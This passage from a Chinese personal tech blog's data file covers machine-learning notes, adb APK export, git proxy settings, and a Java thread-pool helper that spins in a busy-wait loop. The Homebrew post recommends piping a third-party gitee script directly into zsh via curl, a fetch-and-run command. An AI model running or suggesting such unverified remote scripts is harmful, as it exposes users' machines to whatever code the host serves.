y（标记）</li>\n<li>总结规律，预测答案</li>\n<li>具体技术：决策树，支持向量机，朴素贝叶斯，回归预测</li>\n</ul>\n</li>\n<li>无监督学习<ul>\n<li>训练样本只有 x 没有 y</li>\n<li>可以总结特征的一些规律，但是无法知道答案 y</li>\n<li>具体技术：聚类（k-means），关联规则（apriori）</li>\n</ul>\n</li>\n<li>半监督学习<ul>\n<li>先用无监督学习先做一些聚类，让模型总结相似</li>\n<li>再用少量的带标注的训练样本，告诉模型对应的答案</li>\n<li>模型最后把相似的样本对应到标记</li>\n</ul>\n</li>\n<li>强化学习<ul>\n<li>主要特点：试错学习，延迟反馈，时间是重要因素，当前的行为影响后续接收到的数据</li>\n<li>基本组成：Agent（智能体），Environment（环境），State（状态），Action（行动），Reward（奖励），Value（价值）</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"机器学习模型\"><a href=\"#机器学习模型\" class=\"headerlink\" title=\"机器学习模型\"></a>机器学习模型</h1><ul>\n<li>聚类&#x2F;分类&#x2F;回归（基于 sklearn）</li>\n<li>决策树</li>\n<li>智能推荐算法</li>\n<li>关联规则</li>\n</ul>\n<h1 id=\"数据预处理\"><a href=\"#数据预处理\" class=\"headerlink\" title=\"数据预处理\"></a>数据预处理</h1><ol>\n<li>使用 sklearn 转换器处理数据</li>\n<li>构建并评价聚类模型</li>\n<li>构建并评价分类模型</li>\n<li>构建并评价回归模型</li>\n</ol>\n<h2 id=\"将数据集划分为训练集和测试集\"><a href=\"#将数据集划分为训练集和测试集\" class=\"headerlink\" title=\"将数据集划分为训练集和测试集\"></a>将数据集划分为训练集和测试集</h2><p>典型划分方式是训练集 50%，验证集和测试集各占 25%。</p>\n<ul>\n<li>当数据总量较少时，常用方法是留少部分做测试集，然后对其余样本采用 K 折交叉验证法。</li>\n<li>tran_test_split 函数</li>\n</ul>\n<h2 id=\"使用-sklearn-转换器进行数据预处理与降维\"><a href=\"#使用-sklearn-转换器进行数据预处理与降维\" class=\"headerlink\" title=\"使用 sklearn 转换器进行数据预处理与降维\"></a>使用 sklearn 转换器进行数据预处理与降维</h2><p>使用 sklearn 转换器能够实现对传入的 numpy 数组进行标准化处理、归一化处理、二值化处理、PCA 降维等操作，主要包括 3 个方法。</p>\n<ul>\n<li>fit</li>\n<li>transform</li>\n<li>fit_transform</li>\n</ul>\n<p>在数据分析过程中，各类特征处理相关的操作都需要对训练集和测试集分开操作，需要将训练集的操作规则权重系数等应用到测试集中。</p>\n<ul>\n<li>MinMaxScaler</li>\n<li>StandardScaler</li>\n<li>Normalizer</li>\n<li>Binarizer</li>\n<li>OneHotEncoder</li>\n<li>FunctionTransformer</li>\n</ul>\n<p>PCA 降维算法函数。</p>\n<ul>\n<li>n_componnets</li>\n<li>copy</li>\n<li>whiten</li>\n<li>svd_solver</li>\n</ul>\n<h2 id=\"使用-sklearn-估计器构建聚类模型\"><a href=\"#使用-sklearn-估计器构建聚类模型\" class=\"headerlink\" title=\"使用 sklearn 估计器构建聚类模型\"></a>使用 sklearn 估计器构建聚类模型</h2><p>算法类别：</p>\n<ul>\n<li>划分（分裂）方法：K-Means 算法（K-平均）、K-MEDOIDS 算法（K-中心点）、CLARANS 算法（基于选择的算法）</li>\n<li>层次分析算法：BIRCH 算法（平衡迭代规约和聚类）、CURE 算法（代表点聚类）、CHAMEleon 算法（动态模型）</li>\n<li>基于密度的方法：DBSCAN 算法（基于高密度连接区域）、DENCLUE 算法（密度分布函数）、OPTICS 算法（对象排序识别）</li>\n<li>基于网格的算法：STING 算法（统计信息网络）、CLIOUE 算法（聚类高维空间）、WAVE-CLUSTER 算法（小波变换）</li>\n</ul>\n<p>常用的聚类算法模块 cluster。</p>\n<h1 id=\"决策树\"><a href=\"#决策树\" class=\"headerlink\" title=\"决策树\"></a>决策树</h1><p>决策树是机器学习中一种基本的分类和回归算法，是依托于策略抉择而建立起来的树。</p>\n<h2 id=\"随机森林\"><a href=\"#随机森林\" class=\"headerlink\" title=\"随机森林\"></a>随机森林</h2><p>随机森林是通过机器学习的思想将多棵树集成的一种算法，它的基本单元是决策树，本质属于集成学习（Ensemble Learning）方法。</p>\n<h1 id=\"Xgboost-算法\"><a href=\"#Xgboost-算法\" class=\"headerlink\" title=\"Xgboost 算法\"></a>Xgboost 算法</h1><p>根据各个弱分类器之间有无依赖关系，分为：</p>\n<ul>\n<li>Boosting 流派，各分类器之间有依赖关系，必须串行，如 Adaboost、GBDT（Gradient Boosting Decision Tree）、Xgboost</li>\n<li>Bagging 流派，各分类器之间没有依赖关系，可各自并行，如随机森林（Random Forest）</li>\n</ul>\n<h1 id=\"智能推荐算法\"><a href=\"#智能推荐算法\" class=\"headerlink\" title=\"智能推荐算法\"></a>智能推荐算法</h1><p>具体主流模型</p>\n<ol>\n<li>协同过滤算法（Collaborate Filtering）<ol>\n<li>基于对用户历史行为数据的挖掘发现用户的喜好偏向，并预测用户可能喜好的 item（产品，服务）进行推荐</li>\n<li>主要实现：<ul>\n<li>根据有共同喜好的人进行推荐</li>\n<li>根据喜好的 item 推荐相似 item</li>\n<li>根据以上条件综合推荐</li>\n</ul>\n</li>\n<li>常用算法分为两种：<ul>\n<li>基于用户的协同过滤算法（userCF）</li>\n<li>基于物品的协同过滤算法（itemCF）</li>\n</ul>\n</li>\n</ol>\n</li>\n<li>隐语义模型（Latent Factor Model）<ol>\n<li>对所有的 item（产品，文档）进行分类，再根据用户的兴趣分类给用户推荐该分类中的 item</li>\n<li>模型的主要工作：<ul>\n<li>给 item 分类</li>\n<li>确定用户兴趣（特征）属于哪些类及感兴趣程度</li>\n<li>对于用户感兴趣的类，具体推荐哪些 item 给用户</li>\n</ul>\n</li>\n</ol>\n</li>\n<li>图<ol>\n<li>以 Personal Rank 为例，将用户行为数据用二分图表示，例如用户数据是由一系列的二元组组成，其中每个元组（u，i）表示用户 u 对物品 i 产生过行为</li>\n</ol>\n</li>\n</ol>\n<h1 id=\"关联规则\"><a href=\"#关联规则\" class=\"headerlink\" title=\"关联规则\"></a>关联规则</h1><p>是反映一个事物与其他事物之间的相互依存性和关联性。</p>\n<p>常用于实体电商或在线电商的推荐系统：通过对顾客的购买记录数据库进行关联规则挖掘，最终目的是发现顾客群体的购买习惯的内在共性。</p>\n<p>关键概念：</p>\n<ol>\n<li>支持度（Support）</li>\n</ol>\n<ul>\n<li>两件商品（X∩Y）在总销售笔数（N）中出现的概率</li>\n</ul>\n<ol start=\"2\">\n<li>置信度（Confidence）</li>\n</ol>\n<ul>\n<li>购买 X 后再购买 Y 的条件概率</li>\n</ul>\n<ol start=\"3\">\n<li>提升度（Lift）</li>\n</ol>\n<ul>\n<li>表示先购买 X 对购买 Y 的概率的提升作用，用来判断规则是否有实际价值</li>\n</ul>\n<h1 id=\"机器学习应用\"><a href=\"#机器学习应用\" class=\"headerlink\" title=\"机器学习应用\"></a>机器学习应用</h1><h2 id=\"金融反欺诈：检测，响应，预防\"><a href=\"#金融反欺诈：检测，响应，预防\" class=\"headerlink\" title=\"金融反欺诈：检测，响应，预防\"></a>金融反欺诈：检测，响应，预防</h2><p>应用实践：</p>\n<ol>\n<li>利用设备指纹技术对设备和身份进行初步识别</li>\n<li>基于非监督式的异常检测，将数据分解为正常趋势、随机扰动和异常情况三个部分</li>\n<li>在第 2 基础上实现画像，对设备、网络和用户三个层面的“千人千面”</li>\n<li>基于生成式概率模型的特征学习，形成了统一的多层特征模型</li>\n<li>将各个维度的特征统一成一种单位，归一化处理便于模型和人工对欺诈风险进行综合评估，规避传统静态规则的灵活性差的问题</li>\n<li>基于图模型学习的欺诈网络识别，利用高效的图聚类和社交网络算法，对欺诈网络进行动态地实时识别</li>\n</ol>\n<p>实例：账户盗用检测、支付欺诈监测、内容滥用监测、营销推广滥用监测。</p>\n<h2 id=\"文本分类分析\"><a href=\"#文本分类分析\" class=\"headerlink\" title=\"文本分类分析\"></a>文本分类分析</h2><p>把文档转为向量，按复杂性排序：</p>\n<ol>\n<li>加载文档，切词，NLP</li>\n<li>将切词结果转为词汇库（编号，出现频次）</li>\n<li>对切词结果进行清洗，转为精简词汇库（出现与否）</li>\n</ol>\n<h1 id=\"示例代码库\"><a href=\"#示例代码库\" class=\"headerlink\" title=\"示例代码库\"></a>示例代码库</h1><p><a href=\"https://github.com/Ashestar/python_data_mining\">https://github.com/Ashestar/python_data_mining</a></p>"},{"layout":"pages","title":"Android导出已安装apk文件","date":"2022-07-25T15:16:27.000Z","_content":"\n在`WSA`愉快的玩耍过程中，想要测试一下手机上已安装的应用，只能用流量的我心疼再下载一次的花费，于是搜索能不能通过`adb`导出自己手机上的软件，说实话还挺容易的。\n\n<!--more-->\n\n1. adb 连接手机\n\n首先就是要让电脑通过`adb`连接上自己的手机了。\n\n电脑要下载[adb](https://developer.android.google.cn/studio/command-line/adb?hl=zh-cn)\n\n再打开手机的开发者选项，开启 USB 调试，后面可以通过两种方式连接。\n\n- usb 连接\n\n  ```bash\n  # 查看并连接设备\n  adb devices\n  ```\n\n- wifi 连接（在同一局域网）\n\n  ```bash\n  # adb connect\n  adb connect phone_ip:phone_port\n  ```\n\n2. adb 导出已安装程序\n\n```bash\n# 查看设备已安装的应用\nadb shell pm list packages\n\n# 查看apk的路径\nadb shell pm path package_name\n\n# 导出apk到某个路径\nadb pull package_path target_path\n```\n\n3. 通过 adb 安装 apk\n\n```bash\nadb install package_path\n```\n\n4. 我发现这样只是拿到安装包，我手机上的应用数据并没有拿下来，就比如安装完游戏想玩还是要下一遍更新数据。。。\n\n# 参考文章\n\n- [Android 导出已安装应用程序 apk 文件的两种方案](https://blog.csdn.net/zhangphil/article/details/84838096)\n","source":"_posts/2022/07/Android导出已安装apk文件.md","raw":"---\nlayout: pages\ntitle: Android导出已安装apk文件\ndate: 2022-07-25 23:16:27\ntags:\n  - Android\n  - adb\ncategories:\n  - Android\n  - adb\n---\n\n在`WSA`愉快的玩耍过程中，想要测试一下手机上已安装的应用，只能用流量的我心疼再下载一次的花费，于是搜索能不能通过`adb`导出自己手机上的软件，说实话还挺容易的。\n\n<!--more-->\n\n1. adb 连接手机\n\n首先就是要让电脑通过`adb`连接上自己的手机了。\n\n电脑要下载[adb](https://developer.android.google.cn/studio/command-line/adb?hl=zh-cn)\n\n再打开手机的开发者选项，开启 USB 调试，后面可以通过两种方式连接。\n\n- usb 连接\n\n  ```bash\n  # 查看并连接设备\n  adb devices\n  ```\n\n- wifi 连接（在同一局域网）\n\n  ```bash\n  # adb connect\n  adb connect phone_ip:phone_port\n  ```\n\n2. adb 导出已安装程序\n\n```bash\n# 查看设备已安装的应用\nadb shell pm list packages\n\n# 查看apk的路径\nadb shell pm path package_name\n\n# 导出apk到某个路径\nadb pull package_path target_path\n```\n\n3. 通过 adb 安装 apk\n\n```bash\nadb install package_path\n```\n\n4. 我发现这样只是拿到安装包，我手机上的应用数据并没有拿下来，就比如安装完游戏想玩还是要下一遍更新数据。。。\n\n# 参考文章\n\n- [Android 导出已安装应用程序 apk 文件的两种方案](https://blog.csdn.net/zhangphil/article/details/84838096)\n","slug":"2022/07/Android导出已安装apk文件","published":1,"updated":"2022-09-26T15:02:25.012Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj50025zge3fh9b43n9","content":"<p>在<code>WSA</code>愉快的玩耍过程中，想要测试一下手机上已安装的应用，只能用流量的我心疼再下载一次的花费，于是搜索能不能通过<code>adb</code>导出自己手机上的软件，说实话还挺容易的。</p>\n<span id=\"more\"></span>\n\n<ol>\n<li>adb 连接手机</li>\n</ol>\n<p>首先就是要让电脑通过<code>adb</code>连接上自己的手机了。</p>\n<p>电脑要下载<a href=\"https://developer.android.google.cn/studio/command-line/adb?hl=zh-cn\">adb</a></p>\n<p>再打开手机的开发者选项，开启 USB 调试，后面可以通过两种方式连接。</p>\n<ul>\n<li><p>usb 连接</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看并连接设备</span></span><br><span class=\"line\">adb devices</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>wifi 连接（在同一局域网）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># adb connect</span></span><br><span class=\"line\">adb connect phone_ip:phone_port</span><br></pre></td></tr></table></figure></li>\n</ul>\n<ol start=\"2\">\n<li>adb 导出已安装程序</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看设备已安装的应用</span></span><br><span class=\"line\">adb shell pm list packages</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查看apk的路径</span></span><br><span class=\"line\">adb shell pm path package_name</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 导出apk到某个路径</span></span><br><span class=\"line\">adb pull package_path target_path</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>通过 adb 安装 apk</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb install package_path</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>我发现这样只是拿到安装包，我手机上的应用数据并没有拿下来，就比如安装完游戏想玩还是要下一遍更新数据。。。</li>\n</ol>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://blog.csdn.net/zhangphil/article/details/84838096\">Android 导出已安装应用程序 apk 文件的两种方案</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>在<code>WSA</code>愉快的玩耍过程中，想要测试一下手机上已安装的应用，只能用流量的我心疼再下载一次的花费，于是搜索能不能通过<code>adb</code>导出自己手机上的软件，说实话还挺容易的。</p>","more":"<ol>\n<li>adb 连接手机</li>\n</ol>\n<p>首先就是要让电脑通过<code>adb</code>连接上自己的手机了。</p>\n<p>电脑要下载<a href=\"https://developer.android.google.cn/studio/command-line/adb?hl=zh-cn\">adb</a></p>\n<p>再打开手机的开发者选项，开启 USB 调试，后面可以通过两种方式连接。</p>\n<ul>\n<li><p>usb 连接</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看并连接设备</span></span><br><span class=\"line\">adb devices</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>wifi 连接（在同一局域网）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># adb connect</span></span><br><span class=\"line\">adb connect phone_ip:phone_port</span><br></pre></td></tr></table></figure></li>\n</ul>\n<ol start=\"2\">\n<li>adb 导出已安装程序</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看设备已安装的应用</span></span><br><span class=\"line\">adb shell pm list packages</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查看apk的路径</span></span><br><span class=\"line\">adb shell pm path package_name</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 导出apk到某个路径</span></span><br><span class=\"line\">adb pull package_path target_path</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>通过 adb 安装 apk</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb install package_path</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>我发现这样只是拿到安装包，我手机上的应用数据并没有拿下来，就比如安装完游戏想玩还是要下一遍更新数据。。。</li>\n</ol>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://blog.csdn.net/zhangphil/article/details/84838096\">Android 导出已安装应用程序 apk 文件的两种方案</a></li>\n</ul>"},{"layout":"pages","title":"AppleSilicon芯片macOS配置","date":"2022-07-26T12:06:13.000Z","_content":"\n买了 Apple Silicon 芯片的电脑，就需要考虑安装软件的适配性和配置上的差异了，所幸我不是第一个吃螃蟹的，现在软件生态也逐步地建立起来了。\n\n<!--more-->\n\n# Homebrew\n\n最重要的 Homebrew 一定要先配置好，使用 gitee 上大佬配置好的脚本，无痛快捷。\n\n```bash\n/bin/zsh -c \"$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)\"\n```\n\n执行后根据提示选择镜像源就好，会提示安装 git 和 Xcode Command Line Tool，安装完重新执行安装 Homebrew 的命令。\n\nm 系列芯片 的 macOS 上 Homebrew 的路径是 `/opt/homebrew`。\n\n# 参考文章\n\n[MacBook 使用笔记：安装 Homebrew（M1）](https://zhuanlan.zhihu.com/p/372576355)\n","source":"_posts/2022/07/AppleSilicon芯片macOS配置.md","raw":"---\nlayout: pages\ntitle: AppleSilicon芯片macOS配置\ndate: 2022-07-26 20:06:13\ntags:\n  - 配置\n  - macOS\ncategories:\n  - 配置\n  - macOS\n---\n\n买了 Apple Silicon 芯片的电脑，就需要考虑安装软件的适配性和配置上的差异了，所幸我不是第一个吃螃蟹的，现在软件生态也逐步地建立起来了。\n\n<!--more-->\n\n# Homebrew\n\n最重要的 Homebrew 一定要先配置好，使用 gitee 上大佬配置好的脚本，无痛快捷。\n\n```bash\n/bin/zsh -c \"$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)\"\n```\n\n执行后根据提示选择镜像源就好，会提示安装 git 和 Xcode Command Line Tool，安装完重新执行安装 Homebrew 的命令。\n\nm 系列芯片 的 macOS 上 Homebrew 的路径是 `/opt/homebrew`。\n\n# 参考文章\n\n[MacBook 使用笔记：安装 Homebrew（M1）](https://zhuanlan.zhihu.com/p/372576355)\n","slug":"2022/07/AppleSilicon芯片macOS配置","published":1,"updated":"2022-09-26T15:02:02.316Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj50027zge3d1p7cege","content":"<p>买了 Apple Silicon 芯片的电脑，就需要考虑安装软件的适配性和配置上的差异了，所幸我不是第一个吃螃蟹的，现在软件生态也逐步地建立起来了。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"Homebrew\"><a href=\"#Homebrew\" class=\"headerlink\" title=\"Homebrew\"></a>Homebrew</h1><p>最重要的 Homebrew 一定要先配置好，使用 gitee 上大佬配置好的脚本，无痛快捷。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/zsh -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>执行后根据提示选择镜像源就好，会提示安装 git 和 Xcode Command Line Tool，安装完重新执行安装 Homebrew 的命令。</p>\n<p>m 系列芯片 的 macOS 上 Homebrew 的路径是 <code>/opt/homebrew</code>。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://zhuanlan.zhihu.com/p/372576355\">MacBook 使用笔记：安装 Homebrew（M1）</a></p>\n","site":{"data":{}},"excerpt":"<p>买了 Apple Silicon 芯片的电脑，就需要考虑安装软件的适配性和配置上的差异了，所幸我不是第一个吃螃蟹的，现在软件生态也逐步地建立起来了。</p>","more":"<h1 id=\"Homebrew\"><a href=\"#Homebrew\" class=\"headerlink\" title=\"Homebrew\"></a>Homebrew</h1><p>最重要的 Homebrew 一定要先配置好，使用 gitee 上大佬配置好的脚本，无痛快捷。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/zsh -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>执行后根据提示选择镜像源就好，会提示安装 git 和 Xcode Command Line Tool，安装完重新执行安装 Homebrew 的命令。</p>\n<p>m 系列芯片 的 macOS 上 Homebrew 的路径是 <code>/opt/homebrew</code>。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://zhuanlan.zhihu.com/p/372576355\">MacBook 使用笔记：安装 Homebrew（M1）</a></p>"},{"layout":"pages","title":"github clone 失败解决","date":"2022-07-24T15:12:33.000Z","_content":"\ngithub clone 一直失败，挂了梯子，现在记录一下怎么配置 git 代理。\n\n<!--more-->\n\n# 设置代理\n\n```bash\n# http代理\ngit config --global http.proxy 'http://127.0.0.1:your_port'\ngit config --global http.proxy 'socks5://127.0.0.1:your_port'\n\n# https代理\ngit config --global https.proxy 'https://127.0.0.1:your_port'\ngit config --global https.proxy 'socks5://127.0.0.1:your_port'\n```\n\n# 取消代理\n\n```bash\ngit config --global --unset http.proxy\n\ngit config --global --unset https.proxy\n```\n\n# 查看代理\n\n```bash\ngit config --global --get http.proxy\n\ngit config --global --get https.proxy\n```\n\n# 参考文章\n\n- [github clone 超时、速度慢，git 设置代理和取消代理设置](https://blog.csdn.net/csdn_zhangshi/article/details/104882554)\n","source":"_posts/2022/07/git设置或取消代理.md","raw":"---\nlayout: pages\ntitle: github clone 失败解决\ndate: 2022-07-24 23:12:33\ntags:\n  - 配置\n  - Git\ncategories:\n  - 配置\n  - Git\n---\n\ngithub clone 一直失败，挂了梯子，现在记录一下怎么配置 git 代理。\n\n<!--more-->\n\n# 设置代理\n\n```bash\n# http代理\ngit config --global http.proxy 'http://127.0.0.1:your_port'\ngit config --global http.proxy 'socks5://127.0.0.1:your_port'\n\n# https代理\ngit config --global https.proxy 'https://127.0.0.1:your_port'\ngit config --global https.proxy 'socks5://127.0.0.1:your_port'\n```\n\n# 取消代理\n\n```bash\ngit config --global --unset http.proxy\n\ngit config --global --unset https.proxy\n```\n\n# 查看代理\n\n```bash\ngit config --global --get http.proxy\n\ngit config --global --get https.proxy\n```\n\n# 参考文章\n\n- [github clone 超时、速度慢，git 设置代理和取消代理设置](https://blog.csdn.net/csdn_zhangshi/article/details/104882554)\n","slug":"2022/07/git设置或取消代理","published":1,"updated":"2022-09-26T15:00:11.585Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj5002czge35td7e02b","content":"<p>github clone 一直失败，挂了梯子，现在记录一下怎么配置 git 代理。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"设置代理\"><a href=\"#设置代理\" class=\"headerlink\" title=\"设置代理\"></a>设置代理</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># http代理</span></span><br><span class=\"line\">git config --global http.proxy <span class=\"string\">&#x27;http://127.0.0.1:your_port&#x27;</span></span><br><span class=\"line\">git config --global http.proxy <span class=\"string\">&#x27;socks5://127.0.0.1:your_port&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># https代理</span></span><br><span class=\"line\">git config --global https.proxy <span class=\"string\">&#x27;https://127.0.0.1:your_port&#x27;</span></span><br><span class=\"line\">git config --global https.proxy <span class=\"string\">&#x27;socks5://127.0.0.1:your_port&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"取消代理\"><a href=\"#取消代理\" class=\"headerlink\" title=\"取消代理\"></a>取消代理</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br><span class=\"line\"></span><br><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> https.proxy</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"查看代理\"><a href=\"#查看代理\" class=\"headerlink\" title=\"查看代理\"></a>查看代理</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global --get http.proxy</span><br><span class=\"line\"></span><br><span class=\"line\">git config --global --get https.proxy</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://blog.csdn.net/csdn_zhangshi/article/details/104882554\">github clone 超时、速度慢，git 设置代理和取消代理设置</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>github clone 一直失败，挂了梯子，现在记录一下怎么配置 git 代理。</p>","more":"<h1 id=\"设置代理\"><a href=\"#设置代理\" class=\"headerlink\" title=\"设置代理\"></a>设置代理</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># http代理</span></span><br><span class=\"line\">git config --global http.proxy <span class=\"string\">&#x27;http://127.0.0.1:your_port&#x27;</span></span><br><span class=\"line\">git config --global http.proxy <span class=\"string\">&#x27;socks5://127.0.0.1:your_port&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># https代理</span></span><br><span class=\"line\">git config --global https.proxy <span class=\"string\">&#x27;https://127.0.0.1:your_port&#x27;</span></span><br><span class=\"line\">git config --global https.proxy <span class=\"string\">&#x27;socks5://127.0.0.1:your_port&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"取消代理\"><a href=\"#取消代理\" class=\"headerlink\" title=\"取消代理\"></a>取消代理</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br><span class=\"line\"></span><br><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> https.proxy</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"查看代理\"><a href=\"#查看代理\" class=\"headerlink\" title=\"查看代理\"></a>查看代理</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global --get http.proxy</span><br><span class=\"line\"></span><br><span class=\"line\">git config --global --get https.proxy</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://blog.csdn.net/csdn_zhangshi/article/details/104882554\">github clone 超时、速度慢，git 设置代理和取消代理设置</a></li>\n</ul>"},{"layout":"pages","title":"Java多线程之Executors类的newFixedThreadPool方法","date":"2022-07-27T14:50:33.000Z","_content":"\n# 前言\n\n做的项目有涉及到读取 Excel 进行批量导入数据，本来是一行行单线程读取，虽然每行有一百多列，数据少的情况下倒没什么问题，但是给业务做测试时发现每次导几千条数据，这时候处理的时间就直接导致 http 请求超时，业务又要求导入数据不符合规范时将错误信息返回给前端，这时候就要想办法优化了，最简单直接的方法是直接上多线程处理。\n\n<!--more-->\n\n# newFixedThreadPool\n\n经过寻求场外协助，知道 Java 有 `Executors` 类的`newFixedThreadPool`方法可以很方便地建立一个固定大小的线程池，加上 bing 的帮助，写了一个多线程处理 List 的方法。\n\n```java\n    /**\n     * 使用 Executors 的 newFixedThreadPool 执行多线程处理 List 任务\n     *\n     * @param usage\n     * @param list\n     * @param biConsumer\n     * @param <T>\n     */\n    public static <T> void fixedThreadPool(String usage, List<T> list, BiConsumer<Integer, T> biConsumer) {\n        _log.info(usage + \" =>  使用固定大小线程池处理List开始，线程池大小：\" + threadNum);\n        long startTime = System.currentTimeMillis();\n        ExecutorService executorService = Executors.newFixedThreadPool(threadNum);\n        int n = 0;\n        for (T value: list) {\n            int index = n++;\n            // execute：无返回值\n            // submit：返回Future对象\n            executorService.execute(() -> {\n                biConsumer.accept(index, value);\n            });\n        }\n        // 停止提交\n        executorService.shutdown();\n        // 阻塞直到所有线程结束\n        while (true) {\n            if (executorService.isTerminated()) {\n                long endTime = System.currentTimeMillis();\n                _log.info(usage + \" =>  使用固定大小线程池处理List结束，总执行时间：\" + (endTime - startTime) + \"ms\");\n                break;\n            }\n        }\n    